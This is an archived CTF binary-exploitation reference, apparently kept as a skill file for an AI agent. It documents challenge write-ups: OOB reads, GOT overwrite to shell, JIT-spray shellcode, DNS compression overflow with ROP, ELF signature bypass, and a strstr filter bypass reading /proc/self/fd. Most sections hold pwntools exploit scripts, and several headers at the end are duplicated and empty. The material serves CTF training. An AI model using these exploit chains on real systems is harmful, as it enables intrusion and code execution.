---
type: raw-source
source_kind: archived-skill-reference
category: pwn
related_skill: ctf-pwn
original_path: "C:/Users/LMY/.agents/skills/ctf-pwn/references/oob-jit-parser-and-readonly-primitives.md"
original_reference: "references/oob-jit-parser-and-readonly-primitives.md"
original_sha256: "7c49733e6dd27c65c0eb7b909de252a04874c640dac70350be0e5fb9e9eb3f15"
archived_at: 2026-05-21
status: archived
---

# Archived Skill Reference: ctf-pwn/references/oob-jit-parser-and-readonly-primitives.md

> 本文件是 skill reference 的 raw archive 快照，用作 ctf-wiki 的原始资料。原 skill 文件仍保留在原位置，当前迁移阶段不修改原 skill。

## Archive Metadata

- Original path: `C:/Users/LMY/.agents/skills/ctf-pwn/references/oob-jit-parser-and-readonly-primitives.md`
- Original SHA256: `7c49733e6dd27c65c0eb7b909de252a04874c640dac70350be0e5fb9e9eb3f15`
- Archived at: `2026-05-21`

---
# CTF Pwn - OOB, JIT, Parser and Read-Only Primitives

## 阅读定位

- 本卷偏 **OOB、JIT、解析器边界和只读原语链**，案例密度高，适合已有较清晰 exploit 形态后查阅。
- 如果问题更靠近 Windows、ARM、bit-flip 或跨平台 exploit，去 windows-arm-and-cross-platform-exploits.md。
- 如果题目只是常规 stack / heap / ROP，请先回基础文档，不要从这里起步。


## Table of Contents
- [Stack Variable Overlap / Carry Corruption OOB (srdnlenCTF 2026)](#stack-variable-overlap--carry-corruption-oob-srdnlenctf-2026)
- [1-Byte Overflow via 8-bit Loop Counter (srdnlenCTF 2026)](#1-byte-overflow-via-8-bit-loop-counter-srdnlenctf-2026)
- [Game AI Arithmetic Mean OOB Read (BSidesSF 2024)](#game-ai-arithmetic-mean-oob-read-bsidessf-2024)
- [Arbitrary Read/Write to Shell via GOT Overwrite (BSidesSF 2026)](#arbitrary-readwrite-to-shell-via-got-overwrite-bsidessf-2026)
- [Stack Leak via __environ and memcpy Overflow (BSidesSF 2026)](#stack-leak-via-__environ-and-memcpy-overflow-bsidessf-2026)
- [JIT Sandbox Escape via Conditional Jump uint16 Truncation (BSidesSF 2026)](#jit-sandbox-escape-via-conditional-jump-uint16-truncation-bsidessf-2026)
- [DNS Compression Pointer Stack Overflow with Multi-Question ROP (BSidesSF 2026)](#dns-compression-pointer-stack-overflow-with-multi-question-rop-bsidessf-2026)
- [ELF Code Signing Bypass via Program Header Manipulation (BSidesSF 2026)](#elf-code-signing-bypass-via-program-header-manipulation-bsidessf-2026)
- [Game Level Format Signed/Unsigned Coordinate Mismatch (BSidesSF 2026)](#game-level-format-signedunsigned-coordinate-mismatch-bsidessf-2026)
- [File Descriptor Inheritance via Missing O_CLOEXEC (BSidesSF 2026)](#file-descriptor-inheritance-via-missing-o_cloexec-bsidessf-2026)
- [Sign Extension Integer Underflow in Metadata Parsing (BSidesSF 2026)](#sign-extension-integer-underflow-in-metadata-parsing-bsidessf-2026)
- [ROP Chain Construction with Read-Only Primitive (BSidesSF 2026)](#rop-chain-construction-with-read-only-primitive-bsidessf-2026)
- [4-Byte Shellcode with Timing Side-Channel via Persistent Registers (Google CTF 2017)](#4-byte-shellcode-with-timing-side-channel-via-persistent-registers-google-ctf-2017)
- [CRC Oracle as Arbitrary Read Primitive (ASIS CTF 2017)](#crc-oracle-as-arbitrary-read-primitive-asis-ctf-2017)
- [UTF-8 Case Conversion Buffer Overflow (HITB CTF 2017)](#utf-8-case-conversion-buffer-overflow-hitb-ctf-2017)

---

## OOB / JIT / Parser 原语技巧族

### Stack Variable Overlap / Carry Corruption OOB (srdnlenCTF 2026)

**模式（common_offset）：** Stack variables share storage due to compiler layout. Carry from arithmetic on one variable corrupts an adjacent variable, enabling OOB access.

**Vulnerability:** `index` (byte at `[rsp+0x49]`) and `offset` (word at `[rsp+0x48]`) share storage. Incrementing `offset` by 255 causes a carry that corrupts `index` from 3 to 4, producing out-of-bounds table access.

**关键结论：** When variables of different sizes are packed adjacent on the stack (e.g., byte immediately after word), arithmetic overflow on the smaller-address variable carries into the larger-address variable. This is subtle in disassembly — look for overlapping `[rsp+N]` accesses with different operand sizes.

---

### 1-Byte Overflow via 8-bit Loop Counter (srdnlenCTF 2026)

**模式（Echo）：** Custom `read_stdin()` uses 8-bit loop counter that wraps around, writing 65 bytes to a 64-byte buffer, overflowing into an adjacent size variable.

**Progressive leak technique:**
1. Trigger 1-byte overflow to increase buffer size from 0x40 to 0x48
2. With enlarged buffer, read further on stack — leak canary and saved rbp
3. Increase size to 0x77 to leak main's libc return address from stack
4. Compute libc base from leaked return address offset
5. Craft final payload: restore canary, set fake rbp, overwrite RIP with one-gadget

**One-gadget constraint setup:**
```python
from pwn import *

# Stack layout: buffer[rbp-0x50], size[rbp-0x10], canary[rbp-0x08], rbp, ret
# One-gadget needs NULL at [rbp-0x78] and [rbp-0x60]
buf_addr = leaked_rbp - 0x50  # known from leak
fake_rbp = buf_addr + 0x78

payload = b"\x00" * 8          # [fake_rbp - 0x78] = NULL (constraint)
payload += b"A" * 16
payload += b"\x00" * 8          # [fake_rbp - 0x60] = NULL (constraint)
payload = payload.ljust(64, b"A")
payload += p64(0x48)            # preserve enlarged size
payload += p64(canary)          # restore canary
payload += p64(fake_rbp)        # fake rbp satisfying constraints
payload += p64(one_gadget)      # libc one-gadget
```

**关键结论：** 8-bit counters in read loops cause off-by-one when the buffer size equals the counter's range (64 → wraps after 64, writes byte 65). The 1-byte overflow into a size field creates a progressive information disclosure primitive: each round leaks more stack data, enabling a full exploit chain from a single-byte overflow.

---

---

### Game AI Arithmetic Mean OOB Read (BSidesSF 2024)

When a game computes AI moves as the arithmetic mean of player input and previous state, submitting out-of-bounds coordinates produces a controlled OOB access:

```c
// AI "Smartypants" strategy: average of human and last computer move
ai_move.row = (human_move.row + last_computer.row) / 2;
ai_move.col = (human_move.col + last_computer.col) / 2;
// Bounds validation happens AFTER ai_move is computed and used
```

Submit extreme values (e.g., row=100000, col=100000) to make the AI compute `(100000 + 0) / 2 = 50001`, which reads well past the game board allocation into stack/heap memory.

```python
from pwn import *

# Brute-force memory offset to find flag
for offset in range(-6000, 6000, 100):
    r = remote(host, port)
    r.sendline(str(offset * 2).encode())  # Row (doubled because AI halves)
    r.sendline(b'0')                       # Col
    response = r.recvall()
    if b'CTF{' in response:
        print(f"Flag at offset {offset}: {response}")
        break
    r.close()
```

**关键结论：** Input validation that occurs after variable assignment creates a TOCTOU gap. Even if the game rejects the move, the computed AI position may have already been used to access memory. The arithmetic mean serves as a divide-by-2 primitive — submit 2x the desired OOB offset as player input.

---

---

### Arbitrary Read/Write to Shell via GOT Overwrite (BSidesSF 2026)

**模式（readwriteme）：** Binary provides explicit arbitrary read and arbitrary write primitives (e.g., "read address" and "write address" menu options). No need for complex heap or format string exploits — just use the primitives directly.

```python
from pwn import *

elf = ELF('./readwriteme')
libc = ELF('./libc.so.6')
p = remote('target', port)

# Step 1: Leak strtoll@GOT
p.sendlineafter(b'> ', b'read')
p.sendlineafter(b'address: ', hex(elf.got['strtoll']).encode())
strtoll_addr = int(p.recvline().strip(), 16)
libc_base = strtoll_addr - libc.sym['strtoll']

# Step 2: Overwrite strtoll@GOT with system
p.sendlineafter(b'> ', b'write')
p.sendlineafter(b'address: ', hex(elf.got['strtoll']).encode())
p.sendlineafter(b'value: ', hex(libc_base + libc.sym['system']).encode())

# Step 3: Next input parsed by strtoll() → system()
p.sendlineafter(b'> ', b'sh')
p.interactive()
```

**Why `strtoll` → `system`:** Both take a `const char *` as first argument. When the binary calls `strtoll(user_input, ...)`, the GOT redirect makes it call `system(user_input)` — the extra arguments are harmlessly ignored.

**关键结论：** When a binary gives you arbitrary read + write, the fastest path to shell is GOT overwrite. Choose a GOT entry for a function that (a) takes a user-controlled string as its first argument, and (b) is called after you perform the overwrite. `strtoll`, `atoi`, `puts`, and `printf` are all good candidates depending on the binary's flow.

**参考：** BSidesSF 2026 "readwriteme"

---

### Arbitrary Read/Write to Shell via GOT Overwrite


---
### Stack Leak via __environ and memcpy Overflow (BSidesSF 2026)

**模式（readme）：** Binary provides an arbitrary read primitive (e.g., `memcpy(stack_buf, user_addr, user_len)`) but NO write primitive. The `memcpy` overflow itself becomes the write primitive.

```python
from pwn import *

elf = ELF('./readme')
libc = ELF('./libc.so.6')
p = remote('target', port)

# Step 1: Leak libc via GOT read
p.sendlineafter(b'> ', f'read {hex(elf.got["puts"])}'.encode())
puts_addr = u64(p.recv(8))
libc_base = puts_addr - libc.sym['puts']

# Step 2: Leak stack via __environ
environ_addr = libc_base + libc.sym['__environ']
p.sendlineafter(b'> ', f'read {hex(environ_addr)}'.encode())
stack_addr = u64(p.recv(8))
# Return address is at known offset from __environ
ret_addr_location = stack_addr - OFFSET_TO_RET  # Determine via debugging

# Step 3: Plant ROP addresses in the input buffer
# The command buffer is also on the stack at a known offset
ret_gadget = libc_base + GADGET_OFFSET
win_func = elf.sym['win']  # or one_gadget
payload = p64(ret_gadget) + p64(win_func)

# Step 4: memcpy overflow to copy planted payload over return address
# memcpy(dest=stack_buf, src=our_planted_addr, len=enough_to_reach_ret)
p.sendlineafter(b'> ', f'read {hex(planted_addr)} {overflow_len}'.encode())

# Step 5: EOF triggers return through overwritten address
p.shutdown('send')
p.interactive()
```

**Why `__environ`:** The global variable `__environ` in libc always points to the process's environment variable array on the stack. Since it's at a fixed libc offset, leaking libc gives you `__environ`, which gives you a stack address. From there, the offset to any stack frame's return address is deterministic (found via debugging).

**关键结论：** When you have only a read primitive, look for ways the read itself can be abused as a write. `memcpy` with user-controlled length overflows the destination buffer, turning a read into a write. The `__environ` → stack leak → return address chain is a standard technique when you need to find the stack without an info leak from the binary itself.

**参考：** BSidesSF 2026 "readme"

---

---

### JIT Sandbox Escape via Conditional Jump uint16 Truncation (BSidesSF 2026)

**模式（rugdoctor）：** A "secure JIT sandbox" compiles a simple scripting language to x86-64 machine code in an RWX buffer. The `if` statement emits a `jz` with a 32-bit relative offset, but the offset calculation truncates to 16 bits: `(uint16_t)code_offset - (uint16_t)if_address - 4`. When the code exceeds 65535 bytes, the truncated offset causes the jump to land inside a future instruction's immediate value.

**Exploitation steps:**
1. Emit ~9370 `add` instructions inside an `if` block with condition `$b = 0` (always-false branch)
2. The truncated `jz` offset lands in the middle of an `add` instruction's 32-bit immediate value
3. The attacker controls the immediate values — embed 2-byte instruction fragments + `jmp $+3` (EB 03) to skip past JIT boilerplate bytes between each `add`
4. Thread a multi-stage shellcode: `mmap` RWX memory via syscall → copy full shellcode byte-by-byte → `call rbx`

```ruby
# Embed 2-byte instruction pairs in add immediates, interleaved with jmp $+3
shellcode_fragments = [
  "\x6a\x00",   # push 0     -> rdi = NULL (mmap addr)
  "\x5f\x90",   # pop rdi / nop
  "\x6a\x07",   # push 7     -> rdx = PROT_RWX
  "\x5a\x90",   # pop rdx / nop
  "\x0f\x05",   # syscall    -> mmap
]

# Each fragment becomes: fragment_bytes + \xEB\x03 (jmp $+3)
# Packed as 32-bit add immediate: fragment[0:2] + EB 03
adds = shellcode_fragments.map { |frag| "#{frag}\xeb\x03".unpack('V').pop }

# Write shellcode byte-by-byte via mov [rax], imm8 / jmp $+3
SHELLCODE.bytes.each do |byte|
  adds << "\xc6\x00#{byte.chr}\xeb".unpack('V').pop   # mov byte ptr [rax], byte
end
```

**关键结论：** The JIT compiler uses `uint16_t` for offset calculation even though the code buffer can exceed 64KB. The 16-bit truncation creates a "JIT spray" where the attacker controls instruction bytes at predictable positions within the RWX buffer. The `jmp $+3` threading technique chains 2-byte instruction fragments separated by 3 bytes of JIT overhead.

**When to recognize:** Challenge involves a JIT compiler or scripting engine that compiles to native code. Look for integer truncation in jump/branch offset calculations, RWX memory regions, and user-controlled immediate values in generated instructions.

**Broader pattern:** JIT spraying attacks embed shellcode fragments in instruction immediates (typically `add`, `xor`, or `mov` constants). The misalignment between intended and actual instruction boundaries turns data into executable code. Common in browser JIT engines and CTF sandbox challenges.

**参考：** BSidesSF 2026 "rugdoctor"

---

### JIT Sandbox Escape via uint16 Jump Truncation


---
### DNS Compression Pointer Stack Overflow with Multi-Question ROP (BSidesSF 2026)

**模式（nameme）：** Custom DNS server has a stack buffer overflow in domain name parsing. DNS compression pointers (`0xC0 | offset`) allow jumping to arbitrary positions in the packet, and the parser does not track total decompressed length. Carefully crafted pointer chains revisit data multiple times, overflowing a 1024-byte stack buffer.

**DNS compression primer:**
- Domain names in DNS packets use label+length encoding: `\x03www\x06google\x03com\x00`
- Compression pointers: byte starting with `0xC0` means "jump to offset in packet" — `\xC0\x0D` jumps to byte 13
- Pointers can chain: A → B → C, potentially revisiting the same data

**Exploitation:**
1. Craft 8 DNS questions with carefully sized names
2. Use compression pointers (`\xC0\x0D`, `\xC0\x0E`) to chain between questions
3. Parser revisits data, expanding each compression hop, overflowing the 1024-byte `dns_question_t.name` buffer
4. ROP chain split across 3 question entries (14+14+13 gadgets) due to per-question size limits
5. ROP executes `sys_read` → `sys_open` → `sys_read` → `sys_write`; flag path sent as second UDP packet

```python
import struct, socket

def encode_question(name_bytes, qtype=1, qclass=1):
    return name_bytes + struct.pack('>HH', qtype, qclass)

# Overflow via compression pointer chains
questions = []
# Questions 1-4: fill buffer with controlled data
# Questions 5-8: use compression pointers to trigger re-expansion
# Final question: \xC0\x0D\x36AAAA...\xC0\x0E triggers overflow

# Build DNS packet: header (QDCOUNT=8) + questions
header = struct.pack('>HHHHHH', 0x1337, 0x0100, 8, 0, 0, 0)
packet = header + b''.join(questions)

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.sendto(packet, (target, 53535))
# Send flag path in second packet after ROP calls sys_read
sock.sendto(b'/home/ctf/flag.txt\x00', (target, 53535))
```

**关键结论：** DNS compression was designed for efficiency but creates a decompression amplification vulnerability. If the parser doesn't track total output length, compression pointer chains can expand a small packet into an arbitrarily large decompressed name. The multi-question format allows splitting a large ROP chain across multiple entries while keeping each entry within DNS label size limits.

**When to recognize:** Challenge involves a custom DNS server (not BIND/dnsmasq). Look for domain name parsing functions with fixed-size output buffers and no length tracking during compression pointer resolution.

**参考：** BSidesSF 2026 "nameme"

---

### DNS Compression Pointer Stack Overflow


---
### ELF Code Signing Bypass via Program Header Manipulation (BSidesSF 2026)

**模式（selfsigned）：** An ELF signing/verification system hashes only section headers and content of sections with the `SHF_ALLOC` flag. Program headers (which control what the loader actually maps) are not directly covered by the hash. By appending shellcode to the file and modifying program headers to load from the appended data, the signature remains valid.

**ELF structure gap:**
- **Section headers** (`.text`, `.data`, etc.): Used by linkers and RE tools; covered by the hash
- **Program headers** (`LOAD`, `INTERP`, etc.): Used by the OS loader to map memory; NOT covered by the hash
- The `e_phoff` field in the ELF file header (pointing to program header table) doesn't change if you modify entries in place

**Exploitation:**
1. Download the signed reference binary from the server
2. Page-align the binary length (pad to 4096-byte boundary)
3. Append shellcode at the padded offset, positioned so it maps to the original entrypoint virtual address
4. Modify the code segment's program header: change `p_offset` to point to the appended data, update `p_filesz`/`p_memsz`
5. Section headers remain unchanged → signature still verifies
6. Upload modified binary; server verifies signature (passes) and executes (runs shellcode)

```python
from elftools.elf.elffile import ELFFile
import struct

def fixup_binary(binary_path, shellcode):
    with open(binary_path, 'rb') as f:
        elf = ELFFile(f)
        data = bytearray(f.read())

    entry = elf.header.e_entry
    orig_len = len(data)

    # Pad to page boundary
    page_size = 0x1000
    padded_len = (orig_len + page_size - 1) & ~(page_size - 1)
    data.extend(b'\x00' * (padded_len - orig_len))

    # Write shellcode at offset matching entrypoint alignment
    sc_offset = padded_len
    data.extend(shellcode)

    # Find and modify the LOAD segment containing .text
    for seg in elf.iter_segments():
        if seg.header.p_type == 'PT_LOAD' and seg.header.p_flags & 0x1:  # PF_X
            # Rewrite this program header entry
            new_phdr = seg.header.copy()
            new_phdr['p_offset'] = sc_offset
            new_phdr['p_filesz'] = len(shellcode)
            new_phdr['p_vaddr'] = entry & ~(page_size - 1)
            # Write modified phdr back to its position in the file
            # ...

    return bytes(data)
```

**关键结论：** Many code signing implementations only hash section-level metadata (section headers + content), not program headers. Since the OS loader uses program headers (not section headers) to map code into memory, an attacker can redirect code loading to attacker-controlled data without invalidating the signature. This is a real-world design flaw found in some embedded and IoT code signing schemes.

**When to recognize:** Challenge involves ELF binary signing/verification. Check what the hash covers — if it only processes sections (especially `SHF_ALLOC` sections), program header manipulation bypasses it.

**Broader lesson:** Secure ELF signing must cover both section AND program headers, or better yet, hash the entire file. Section headers are optional at runtime — a valid ELF can execute with zero sections. Any signing scheme that relies solely on sections is bypassable.

**参考：** BSidesSF 2026 "selfsigned"

---

### ELF Code Signing Bypass via Program Headers


---
### Game Level Format Signed/Unsigned Coordinate Mismatch (BSidesSF 2026)

**模式（blockman-builder）：** A 2D platformer game uses a level editor that parses block placement instructions with signed integer coordinates. The bounds check compares signed values against unsigned dimensions (`if (x1 < level_width && y1 < WORLD_H)`) — when x1 is negative, the signed-to-unsigned comparison passes because a large unsigned value is less than the unsigned width. This allows writing arbitrary bytes (block IDs) to memory before the level array.

**Exploitation steps:**
1. Extract source code from binary (embedded in a custom ELF section, found via `strings`)
2. Enable developer mode (hidden konami-code input sequence) to leak level data stack address
3. Craft level with shellcode bytes encoded as block IDs placed at legitimate positive coordinates
4. Use negative coordinates to overwrite the return address on the stack, pointing to the shellcode in level data
5. Level data is base64+zlib encoded; use pack/unpack scripts

```python
import struct, zlib, base64

# Level format: "clear\n{width}\n{n_entities}\n{entities...}\n{n_blocks}\n{blocks...}"
shellcode = open("shellcode.bin", "rb").read()
leaked_addr = 0x7ffd3de47d70  # From developer mode leak
level_base = leaked_addr       # Level data is on the stack

# Place shellcode bytes as block IDs at positive coordinates
lines = ["clear", "128", "0", "0"]  # width=128, 0 entities, 0 initial blocks
block_lines = []

# Write shellcode to level array at known offset
for i, byte in enumerate(shellcode):
    x = i % 128
    y = i // 128
    block_lines.append(f"{byte},{x},{y}")

# Overwrite return address with negative Y coordinate
ret_offset = -(0x100)  # Offset from level array to saved RIP
# 6-number format: block_id, x1, y1, x2, y2 (rectangle fill)
for i, byte in enumerate(struct.pack("<Q", level_base)):
    block_lines.append(f"{byte},{i},{ret_offset}")

lines[3] = str(len(block_lines))
level_data = "\n".join(lines + block_lines)
encoded = base64.b64encode(zlib.compress(level_data.encode())).decode()
```

**关键结论：** Game level formats that accept coordinates as signed integers but use unsigned comparisons for bounds checking create a classic signed/unsigned confusion vulnerability. The negative coordinate underflows the array index, providing an arbitrary write primitive. Combined with a leaked stack address (from debug/developer features), this turns into reliable code execution.

**When to recognize:** Custom game/level editors with user-defined coordinates, tile-map formats, or any array-indexed data where coordinates are parsed as signed but compared as unsigned. Developer/debug modes that leak memory addresses are a strong hint.

**参考：** BSidesSF 2026 "blockman-builder"

---

### Game Level Format Signed/Unsigned Coordinate Mismatch


---
### File Descriptor Inheritance via Missing O_CLOEXEC (BSidesSF 2026)

**模式（inheritance）：** A service reads a secret into a file descriptor created with `memfd_create("secret", 0)` (without `MFD_CLOEXEC`), then calls `system()` to execute user-supplied commands. The `system()` function spawns a child process via `fork()+exec()`, and the child inherits all open file descriptors that lack the `O_CLOEXEC` flag.

The service blocks certain strings ("proc", "fd", ">", "<") to prevent reading `/proc/self/fd/N`. Bypass using shell quote insertion: `cat /p'r'oc/self/f'd'/4` — the single quotes are transparent to bash but break C-level `strstr()` checks.

```python
from pwn import *

r = remote("target", 1337)

# Service prints "Loaded config into fd 4" or similar
r.recvuntil(b"fd ")
fd_num = int(r.recvline().strip())

# Bypass strstr() filter with shell quote breaking
# "proc" and "fd" are blocked, but p'r'oc and f'd' are not
payload = f"cat /p'r'oc/self/f'd'/{fd_num}"
r.sendline(payload.encode())
flag = r.recvall()
print(flag.decode())
```

**关键结论：** `memfd_create()` without `MFD_CLOEXEC` (or `open()` without `O_CLOEXEC`) leaves file descriptors inheritable across `fork()+exec()`. Any service that reads secrets into FDs and then spawns child processes is vulnerable. The `/proc/self/fd/N` path provides access to inherited descriptors. For filter bypass: shell quote splitting (`p'r'oc`) breaks substring matching in C but bash concatenates the fragments transparently.

**When to recognize:** Service reads a secret file, then lets you run commands (via `system()`, `popen()`, etc.). Check if the FD was opened with `O_CLOEXEC`. Look for string filters that block keywords — single-quote splitting, backslash escaping (`\p\r\o\c`), or variable expansion (`${PATH:0:1}`) can bypass `strstr()`.

**参考：** BSidesSF 2026 "inheritance"

---

### Sign Extension Integer Underflow in Metadata Parsing (BSidesSF 2026)

**模式（if-it-leads）：** A music metadata parser has a `to_int32` function that converts unsigned 32-bit values to signed: `n >= 0x80000000 ? n - 0x100000000 : n`. When applied to a size/offset field, a large unsigned value becomes a large negative signed integer, causing out-of-bounds memory access during processing. Byte-by-byte iteration reveals memory contents.

```python
from pwn import *
import re

flag = b""
for i in range(64):
    # Construct metadata with field value that causes OOB read at offset i
    target_val = 0x80000000 + i  # Becomes negative after to_int32
    payload = craft_metadata(target_val)

    r = process(["./parser", payload])
    output = r.recvall()

    # Extract leaked byte from hexdump or error output
    leaked = extract_byte(output)
    flag += bytes([leaked])
    if b"}" in flag:
        break

print(flag.decode())
```

**关键结论：** Custom `to_int32()` or manual sign extension functions are a red flag. The conversion `n >= 0x80000000 ? n - 0x100000000 : n` makes values in `[0x80000000, 0xFFFFFFFF]` negative, but subsequent code may use the result as an array index or memory offset without re-checking bounds. Incrementally varying the input value leaks memory one byte at a time.

**When to recognize:** Challenge involves file format parsing (media, archives, protocols) with custom integer conversion. Look for manual sign-extension patterns. The leak is incremental — each query reveals one byte, requiring many iterations.

**参考：** BSidesSF 2026 "if-it-leads"

---

### Sign Extension Integer Underflow in Metadata Parsing


---
### ROP Chain Construction with Read-Only Primitive (BSidesSF 2026)

**模式（readme）：** Binary provides only a `read()` primitive (no write, no secret function). Build a ROP chain by:
1. Use `read()` to probe the stack and find the buffer-to-return-address offset
2. Leak libc base from GOT entries
3. Scan libc's `.rodata` and `.text` sections for byte patterns that match needed ROP gadget addresses
4. Use `read(0, stack_addr, N)` to place gadget addresses on the stack by reading specific libc offsets that happen to contain the right bytes
5. Chain: `open("flag.txt") -> read(fd, buf, size) -> write(1, buf, size)`

```python
from pwn import *

elf = ELF('./readme')
libc = ELF('./libc.so.6')

r = remote("target", 1337)

# Step 1: Find offset — fill buffer with pattern, read back from stack
r.sendline(b"read " + p64(stack_addr))
leak = r.recvn(8)
offset = find_pattern_offset(leak)

# Step 2: Leak libc base
r.sendline(b"read " + p64(elf.got['read']))
libc_read = u64(r.recvn(8))
libc_base = libc_read - libc.symbols['read']

# Step 3: Build ORW ROP chain using libc gadgets
pop_rdi = libc_base + find_gadget(libc, "pop rdi; ret")
pop_rsi = libc_base + find_gadget(libc, "pop rsi; ret")
pop_rdx = libc_base + find_gadget(libc, "pop rdx; ret")

rop = flat([
    pop_rdi, 0,           # fd = stdin for read
    # ... read flag path onto stack, then open/read/write chain
])
```

**关键结论：** A read-only primitive is sufficient for full exploitation. The key realization: libc contains billions of byte patterns across `.text`, `.rodata`, `.data`, and `.bss` sections. By reading from specific libc offsets, you can "import" arbitrary byte values onto the stack. This eliminates the need for a write primitive — you write to the stack indirectly by reading from addresses whose content matches your desired payload.

**When to recognize:** Binary has `read()` but no `write()` or win function. The read primitive lets you both leak values AND place data on the stack. The challenge becomes finding the right source addresses in libc to read from, not constructing gadgets.

**参考：** BSidesSF 2026 "readme"

---

### ROP Chain Construction with Read-Only Primitive


---
### 4-Byte Shellcode with Timing Side-Channel via Persistent Registers (Google CTF 2017)

```python
from pwn import *

# Phase 1: Leak stack address via timing (4096x amplification)
# add r12, [rsp] — accumulate stack value into r12
shellcode = asm("add r12, [rsp]")  # 4 bytes
# Timing difference reveals r12 value (large r12 = more loop iterations)

# Phase 2: Write shellcode byte-by-byte to BSS
# mov [r15], r12b — write accumulated byte to target
shellcode = asm("mov [r15], r12b")  # 4 bytes

# Phase 3: Stack pivot via 4-byte gadget
shellcode = asm("push rsp; pop rdi; push r15")  # exactly 4 bytes
```

**关键结论：** Callee-saved registers (r12-r15) persist across the 4096 loop iterations and between separate submissions. The 4096x loop amplifies timing differences enough for reliable side-channel measurement, while iterative register operations build complex state from minimal per-round instructions.

**When to recognize:** Challenge provides a very small shellcode window (4-8 bytes) but executes it in a loop or allows multiple submissions. Check whether callee-saved registers are preserved between iterations.

**参考：** Google CTF 2017

---

### 4-Byte Shellcode with Timing Side-Channel


---
### CRC Oracle as Arbitrary Read Primitive (ASIS CTF 2017)

```python
from pwn import *

CRCLOOKUP = [crc8(bytes([b])) for b in range(256)]  # precompute

def read_byte(addr):
    payload = b"A" * 100 + p32(addr)  # overflow pointer to target address
    crc_result = int(get_crc(1, payload), 16)  # CRC of 1 byte at addr
    return CRCLOOKUP.index(crc_result)  # reverse lookup

def read_dword(addr):
    return sum(read_byte(addr + i) << (i * 8) for i in range(4))

# Chain: leak GOT → libc base → __environ → canary → ROP
got_value = read_dword(elf.got['puts'])
libc_base = got_value - libc.sym['puts']
environ = read_dword(libc_base + libc.sym['__environ'])
canary = read_dword(environ - CANARY_OFFSET)
```

**关键结论：** A CRC function is a bijection on single bytes — each input byte produces a unique CRC. By overflowing a pointer to control the CRC input address and precomputing all 256 single-byte CRCs, each byte of arbitrary memory is recovered via reverse lookup. Chain multiple reads to leak GOT entries, libc base, stack addresses, and canary values.

**When to recognize:** Service computes a checksum or hash on data at a user-influenced address. If the checksum is bijective on single bytes (CRC-8, simple XOR, etc.), it becomes an arbitrary read oracle.

**参考：** ASIS CTF 2017

---

### CRC Oracle as Arbitrary Read Primitive


---
### UTF-8 Case Conversion Buffer Overflow (HITB CTF 2017)

```python
from pwn import *

# \xd6\x87 is a 2-byte UTF-8 char that becomes 4 bytes when uppercased
# 68 such characters: 68 * 2 = 136 input bytes → 68 * 4 = 272 output bytes
# If buffer allocated for input length, output overflows
payload = b"\xd6\x87" * 68 + b"$0;".ljust(8, b" ") + p32(0x400890)
```

**关键结论：** Unicode case conversion can change the byte length of characters. Certain UTF-8 sequences (like U+0587, Armenian small ligature) expand from 2 bytes to 4 bytes when uppercased. If a buffer is sized based on the input length, the longer output overflows it. This affects any code using GLib's `g_utf8_strup()`/`g_utf8_strdown()`, ICU's `u_strToUpper()`, or similar Unicode-aware case conversion functions.

**When to recognize:** Binary performs Unicode case conversion (upper/lower) on user input before copying to a fixed-size buffer. Look for GLib, ICU, or custom UTF-8 processing functions. The overflow ratio depends on the specific characters used.

**参考：** HITB CTF 2017

---

See interpreter-jit-canary-and-integer-exploits.md for VM signed comparison, BF JIT shellcode, type confusion, off-by-one index corruption, DNS overflow, ASAN shadow memory, format string with encoding constraints, custom canary preservation, signed integer bypass, CSV injection, MD5 preimage gadgets, VM GC UAF slab reuse, path traversal sanitizer bypass, and FSOP + seccomp bypass.

See runtime-protection-and-tls-exploits.md for bytecode validator bypass, io_uring UAF with SQE injection, integer truncation bypass, GC null-reference cascading corruption, leakless libc via multi-fgets, signed/unsigned char underflow with TLS destructor hijack, custom shadow stack bypass, and signed int overflow with XSS-to-binary pwn bridge.


---

### UTF-8 Case Conversion Buffer Overflow

### Stack Leak via __environ and memcpy Overflow

---

### File Descriptor Inheritance via Missing O_CLOEXEC

---
